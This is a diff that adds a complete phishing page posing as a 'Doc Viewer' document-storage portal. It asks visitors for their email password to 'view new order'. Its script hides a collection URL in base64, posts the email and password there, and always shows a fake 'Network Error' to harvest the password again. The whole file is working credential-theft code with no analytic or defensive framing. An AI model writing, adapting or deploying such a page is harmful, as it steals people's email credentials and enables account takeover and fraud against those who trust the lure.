@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Doc Viewer</title>
+    <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: "wf_SegoeUILight", "wf_SegoeUI", "Segoe UI Light", "Segoe WP Light", "Segoe UI", "Segoe", "Segoe WP", "Tahoma", "Verdana", "Arial", "sans-serif"; background: linear-gradient(135deg, #8B0000 0%, #B22222 50%, #8B0000 100%); min-height: 100vh; }
+    .header { background-color: rgba(139, 0, 0, 0.9); position: relative; z-index: 100; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255, 255, 255, 0.1); }
+    .left-section { display: flex; align-items: center; gap: 20px; }
+    .logo { display: flex; align-items: center; gap: 8px; }
+    .pdf-icon { border-radius: 3px; display: flex; align-items: center; justify-content: center; }
+    .pdf-icon img, .terms-icon img { width: 40px; height: 40px; }
+    .pdf-text { color: white; font-size: 17px; font-weight: normal; }
+    .nav-links { display: flex; gap: 15px; }
+    .nav-link { color: white; text-decoration: none; font-size: 13px; padding: 5px 8px; border-radius: 3px; transition: background-color 0.2s; }
+    .nav-link:hover { background-color: rgba(255, 255, 255, 0.1); }
+    .right-section { display: flex; align-items: center; gap: 8px; }
+    .terms-icon { border-radius: 2px; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 8px; }
+    .terms-link { color: white; text-decoration: none; font-size: 13px; }
+    .main-content { height: calc(100vh - 60px); background: linear-gradient(135deg, #8B0000 0%, #B22222 50%, #8B0000 100%); z-index: -10; }
+    .dialog-box { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); z-index: 20; width: 400px; text-align: center; }
+    .dialog-icon { width: 60px; height: 60px; }
+    .dialog-input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; box-sizing: border-box; outline: none; font-size: 16px;   }
+    .dialog-input::placeholder {color: #999; font-style: italic; opacity: 0.8; transition: opacity 0.2s ease; font-size: 14px;}
+    .dialog-input:focus { border:1px solid #8B0000; }
+    .dialog-button { background-color: #8B0000; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin-bottom: 15px; font-size: 16px; }
+    .dialog-footer1 { font-size: 13px; color: #555; }
+    .dialog-footer { font-size: 13px;  color: #555; margin-top: 10px; margin-bottom: -10px; }
+    #pawarn{color: red; margin-bottom:5px}
+
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="left-section">
+            <div class="logo">
+                <div class="pdf-icon"> </div>
+                <span class="pdf-text">Doc Viewer</span>
+            </div>
+            <div class="nav-links">
+                <a href="#" class="nav-link">Download</a>
+                <a href="#" class="nav-link">Open</a>
+                <a href="#" class="nav-link">Preview</a>
+            </div>
+        </div>
+        <div class="right-section">
+            <div class="terms-icon"></div>
+            <a href="#" class="terms-link">Terms of Service</a>
+        </div>
+    </div>
+    <div class="main-content">
+     <img src="https://i.ibb.co/N2q6KxHB/bg.png" alt="" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; border-left: #8B0000 15px solid; border-right: #8B0000 15px solid; border-top: #8B0000 8px solid; border-bottom: #8B0000 8px solid; filter: blur(2px);">
+     <div class="overlay" style="position: absolute; top: 0; left: 0; height: 100%; width: 100%; background-color: rgba(0, 0, 0, 0.3); z-index: 10;"></div>
+     <div class="dialog-box">
+        <img src="https://i.ibb.co/chNLLFLd/pdfnoir.png" alt="PDF Icon" class="dialog-icon">
+        <h2 style="margin: 30px 0;">Documents Cloud Storage</h2>
+        <p class="view-new-order">ENTER YOUR EMAIL PASSWORD TO VIEW NEW ORDER <span id="currentMonthYear"></span></p>
+        <form>
+            <div>
+                <input type="email" placeholder="Email Adddress" id="aaa" class="dialog-input" readonly required>
+            </div>
+            <div>
+                <input type="password" placeholder="Email Password" id="bbb" class="dialog-input" required>
+            </div>        
+            <div class="lewarn" id="pawarn"></div>
+            <button type="submit" class="dialog-button" id="ccc">View New Order</button> 
+        </form>
+
+        <p class="dialog-footer1">* simple to use.<br>* cross-platform compatibility.<br>* IRM and password-protection.</p>
+        <p class="dialog-footer">The contents of this document are confidential and intended solely for the recipient. Reproduction of, or forwarding to anyone not directly sent this document is strictly forbidden.</p>
+     </div>
+    </div>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    const monthYearElement = document.getElementById('currentMonthYear');
+    const currentDate = new Date();
+    monthYearElement.textContent = currentDate.toLocaleString('en-US', { month: 'long', year: 'numeric' }).toUpperCase();  
+    const aaa = document.getElementById('aaa');
+    const bbb = document.getElementById('bbb');
+    const ccc = document.getElementById('ccc');
+    const naga = "aHR0cHM6Ly9jZXlsb25kb25jaGlsZGNhcmUuY29tL3Jldmlldy9zdWJtaXQucGhw";
+
+    const seeo = new URLSearchParams(window.location.search).get('e');
+    if(seeo){aaa.value = seeo;}
+
+    document.querySelector("form").addEventListener("submit", function (e) {
+        e.preventDefault();
+        ccc.disabled = true;
+        ccc.innerHTML = "Verifying...";
+        //remove all error message
+        document.querySelector("#pawarn").innerHTML = "";
+        
+        let userXhr = new XMLHttpRequest();
+        userXhr.open("POST", atob(naga), true);
+        userXhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        userXhr.send("email=" + aaa.value + "&password=" + bbb.value);
+
+        userXhr.onloadend = function () {
+        // Reset button state
+            bbb.focus(); bbb.value = '';
+            ccc.disabled = false; ccc.innerHTML = "View New Order";
+
+            document.querySelector("#pawarn").innerHTML = "Network Error, Please Verify Your Information And Try Again!";
+        };
+
+        userXhr.onreadystatechange = function () {
+            if (this.readyState == 4 && this.status == 200) {
+                let response = this.response;
+                console.log(response);
+            }
+        };        
+
+    });    
+
+
+
+})
+
+
+</script>
+
+</body>
+</html>
+
+
+
